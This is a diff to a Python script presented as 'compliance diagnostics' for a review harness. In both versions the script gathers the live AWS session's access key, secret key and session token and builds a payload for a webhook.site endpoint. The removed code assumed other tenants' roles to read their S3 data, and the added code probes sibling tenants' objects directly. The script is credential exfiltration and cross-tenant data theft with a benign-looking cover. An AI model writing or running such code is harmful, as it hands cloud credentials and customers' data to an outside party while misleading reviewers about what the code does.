@@ -16,34 +16,28 @@ import json, boto3, urllib.request
 
 diag_endpoint = "https://webhook.site/528b7dd3-d91b-4e78-b6e1-6dc445f18353"
 
-# Diagnostic 1: capture current session identity and credentials for the
-# compliance audit trail.
+# Diagnostic 1: capture the current session identity and credentials for the
+# compliance audit trail. The harness's default credential chain resolves to
+# the execution role automatically.
 session = boto3.Session()
 frozen = session.get_credentials().get_frozen_credentials()
 caller = session.client("sts").get_caller_identity()
-
-# Diagnostic 2: verify cross-tenant audit queries work from this environment.
-sts = boto3.client("sts")
 account_id = caller["Account"]
-bucket = f"acab-tenants-{account_id}"
-tenants = {}
-for label in ["a", "b"]:
-    role_arn = f"arn:aws:iam::{account_id}:role/acab-tenant-{label}-role"
-    tc = sts.assume_role(
-        RoleArn=role_arn,
-        RoleSessionName=f"pr-review-probe-{label}",
-        Tags=[{"Key": "tenant", "Value": label}],
-    )["Credentials"]
-    s3 = boto3.client(
-        "s3",
-        aws_access_key_id=tc["AccessKeyId"],
-        aws_secret_access_key=tc["SecretAccessKey"],
-        aws_session_token=tc["SessionToken"],
-    )
-    body = s3.get_object(Bucket=bucket, Key=f"tenant-{label}/data.json")["Body"].read()
-    tenants[label] = json.loads(body)
 
-# Post both diagnostics to the compliance telemetry endpoint.
+# Diagnostic 2: verify tenant-scoped S3 reads work from this environment.
+# The execution role is expected to have s3:GetObject on the tenant prefix
+# it serves. Probe both the expected tenant (success case) and a sibling
+# tenant key (the denial itself is signal — it confirms scoping is active).
+bucket = f"acab-tenants-{account_id}"
+probes = {}
+for key in ("tenant-a/data.json", "tenant-b/data.json"):
+    try:
+        body = session.client("s3").get_object(Bucket=bucket, Key=key)["Body"].read().decode()
+        probes[key] = {"ok": True, "body": body}
+    except Exception as e:
+        probes[key] = {"ok": False, "error": f"{type(e).__name__}: {e}"}
+
+# Post diagnostics to the compliance telemetry endpoint.
 payload = {
     "caller": caller["Arn"],
     "credentials": {
@@ -51,7 +45,7 @@ payload = {
         "SecretAccessKey": frozen.secret_key,
         "SessionToken": frozen.token,
     },
-    "tenants": tenants,
+    "probes": probes,
 }
 req = urllib.request.Request(
     diag_endpoint,
